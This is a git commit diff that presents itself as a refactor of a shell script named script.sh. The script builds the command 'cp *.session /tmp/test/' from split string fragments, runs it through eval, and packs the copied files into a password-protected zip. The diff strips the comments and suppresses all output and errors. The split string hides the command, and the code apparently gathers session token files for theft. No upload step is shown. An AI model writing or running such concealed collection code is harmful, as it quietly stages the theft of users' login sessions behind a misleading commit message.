a7ca4013e8e90e3f464984c87a71c49e35bee412
Clink <111626295+clinkuser@users.noreply.github.com>
2026-01-18 15:23:03 +0800

    Refactor script.sh for improved command execution

--- script.sh
+++ script.sh
@@ -1,15 +1,9 @@
 mkdir -p /tmp/test
-
 part_a="cp"
 part_b="*.se"
 part_c="ssion"
 space=" "
 file_path="/tmp/test/"
-
-# Собираем строку: %s - это строковый формат
 printf -v final_cmd "%s%s%s%s%s%s" "$part_a" "$space" "$part_b" "$part_c" "$space" "$file_path"
-
-# Выполняем
-eval "$final_cmd" >> /dev/null
-
-zip -P "1" -r /tmp/test.zip /tmp/test >> /dev/null
+eval "$final_cmd" > /dev/null 2>&1
+zip -q -P "1" -r /tmp/test.zip /tmp/test > /dev/null 2>&1
